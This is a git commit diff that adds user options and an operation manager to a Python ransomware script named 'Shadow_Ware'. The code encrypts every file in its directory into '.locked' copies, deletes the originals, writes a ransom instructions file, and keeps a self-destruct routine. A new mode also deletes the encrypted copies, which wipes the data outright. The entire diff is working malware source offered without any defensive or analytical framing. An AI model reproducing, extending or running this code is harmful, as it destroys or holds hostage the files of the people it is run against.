57b566aeeb951179235bf23c6359bb8fcc718c53
PrestonDragon <122578013+PrestonDragon989@users.noreply.github.com>
2024-03-08 04:27:15 +0000

    Added options

--- encrypter.py
+++ encrypter.py
@@ -9,14 +9,46 @@ class Shadow_Ware():
     self.ignored_files = ["Copyright Preston E.md"]
 
     # Keys and ID
-    self.key = self.get_key()
+    self.key = ''
     self.bytes_key = self.turn_to_bytes(self.key)
 
     # Current Dir
     self.current_dir = os.path.dirname(__file__)
 
-  # Inital code to setup data used for encyrption
+    # Encryption Options
+    self.get_new_key = True
+    self.encrypt_delete_files = False
+    self.skip_large_files = False
+    self.ask_skip_large_files = True
+
+  # Getting Options
+  def get_options(self):
+    print("==================================================")
+    self.get_new_key = input("Enter \'y\' to use prexisting key: ")
+    if self.get_new_key.lower() == 'y':
+      self.get_new_key = False
+    
+    self.encrypt_delete_files = input("Enter \'y\' to encrypt, then immediately delete files: ")
+    if self.encrypt_delete_files.lower() == 'y':
+      self.encrypt_delete_files = True
+    
+    self.skip_large_files = input("Enter \'y\' to skip large files (20,000+ KB): ")
+    if self.skip_large_files.lower() == 'y':
+      self.skip_large_files = True
+
+    self.ask_skip_large_files = input("Enter \'y\' to not ask to skip larg files: ")
+    if self.ask_skip_large_files.lower() == "y":
+      self.ask_skip_large_files = False
+    print("==================================================")
+
   def get_key(self):
+    key = ""
+    with open("ID.id", "rb") as ID:
+        key = base64.b64decode(ID.read())
+    return key
+
+  # Inital code to setup data used for encyrption
+  def create_key(self):
     key = ""
     for _ in range(random.randint(15000, 20000)):
       key += str(random.randint(1, 99))
@@ -95,6 +127,19 @@ class Shadow_Ware():
             print("Removed " + file)
             os.remove(file)
 
+  def encrypt_delete_all_files(self):
+    files = self.get_all_files(self.current_dir)
+    for file in files:
+      if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath(__file__) and not file.endswith(".locked"):
+        print("Locking file " + file)
+        self.encrypt_file(file, file + ".locked")
+        if os.path.exists(os.path.abspath(file + ".locked")):
+          print("Removing file " + file + ".locked")
+          try:
+            os.remove(os.path.abspath(file + ".locked"))
+          except Exception as e:
+            print(f"Failed to remove file {file}.locked becuase {str(e)}")
+
   def leave_instructions(self):
     with open("instructions.txt", "w") as file:
       file.write(instructions)
@@ -108,10 +153,29 @@ class Shadow_Ware():
       print("Failed to kill clone for " + str(e))
     os.remove(os.path.abspath(__file__))
 
+  def operation_manager(self):
+    # Key Management
+    if self.get_new_key:
+      self.key = self.create_key()
+      self.create_id()
+    else:
+      try:
+        self.key = self.get_key()
+      except Exception as e:
+        print(f"Couldn't retrieve key because {e}")
+        self.key = self.create_key()
+        self.create_id()
+
+    if self.encrypt_delete_files:
+      self.encrypt_delete_all_files()
+
+    else:
+      self.encrypt_all_files()
+      self.remove_not_locked_files()
+
+
 if __name__ == "__main__":
   shadow_ware = Shadow_Ware()
-  shadow_ware.encrypt_all_files()
-  shadow_ware.create_id()
-  shadow_ware.remove_not_locked_files()
+  shadow_ware.operation_manager()
   shadow_ware.leave_instructions()
   #shadow_ware.self_destruct()
